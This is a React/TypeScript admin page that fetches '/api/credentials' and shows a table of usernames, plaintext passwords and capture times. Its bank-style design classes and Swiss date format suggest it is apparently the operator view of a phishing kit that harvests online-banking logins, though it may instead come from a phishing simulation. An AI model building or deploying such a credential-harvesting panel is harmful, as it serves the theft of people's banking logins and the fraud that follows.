import { useEffect, useState, useCallback } from "react";
import { Link } from "react-router-dom";
import { useI18n } from "../i18n/I18nContext";

interface CredentialRow {
  id: number;
  username: string;
  password: string;
  created_at: string;
}

const DATE_FORMATTER = new Intl.DateTimeFormat("fr-CH", {
  dateStyle: "short",
  timeStyle: "medium",
});

export function AdminPage() {
  const { t } = useI18n();
  const [rows, setRows] = useState<CredentialRow[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);

  const load = useCallback(async () => {
    setLoading(true);
    setError(null);
    try {
      const res = await fetch("/api/credentials");
      if (!res.ok) throw new Error("HTTP " + res.status);
      setRows(await res.json());
    } catch {
      setError(t("adminError"));
    } finally {
      setLoading(false);
    }
  }, [t]);

  useEffect(() => {
    load();
  }, [load]);

  return (
    <div className="max-w-3xl mx-auto w-full">
      <div className="flex items-center justify-between mb-5 gap-4">
        <h1 className="!leading-[1.2] md:text-3xl sm:text-2xl text-xl tracking-normal text-pf-petrol-11 font-normal">
          {t("adminTitle")}
        </h1>
        <button
          type="button"
          onClick={load}
          className="fpui-btn-primary !h-10 !px-4 text-xs"
          disabled={loading}
        >
          {t("adminRefresh")}
        </button>
      </div>

      <div className="fpui-card">
        {loading ? (
          <p className="text-sm text-pf-grey-6">…</p>
        ) : error ? (
          <p className="text-sm font-bold text-pf-red-3">{error}</p>
        ) : rows.length === 0 ? (
          <p className="text-sm text-pf-grey-6">{t("adminEmpty")}</p>
        ) : (
          <div className="overflow-x-auto">
            <table className="w-full text-sm text-left border-collapse">
              <thead>
                <tr className="border-b border-pf-grey-3">
                  <th className="py-2 pr-4 font-bold text-pf-petrol-8">
                    {t("adminUser")}
                  </th>
                  <th className="py-2 pr-4 font-bold text-pf-petrol-8">
                    {t("adminPass")}
                  </th>
                  <th className="py-2 font-bold text-pf-petrol-8">
                    {t("adminDate")}
                  </th>
                </tr>
              </thead>
              <tbody>
                {rows.map((row) => (
                  <tr key={row.id} className="border-b border-pf-grey-3 last:border-b-0">
                    <td className="py-2 pr-4 break-all">{row.username}</td>
                    <td className="py-2 pr-4 break-all">{row.password}</td>
                    <td className="py-2 whitespace-nowrap">
                      {DATE_FORMATTER.format(new Date(row.created_at))}
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}
      </div>

      <div className="mt-4">
        <Link to="/" className="text-sm text-pf-petrol-8 underline underline-offset-2">
          {t("adminBack")}
        </Link>
      </div>
    </div>
  );
}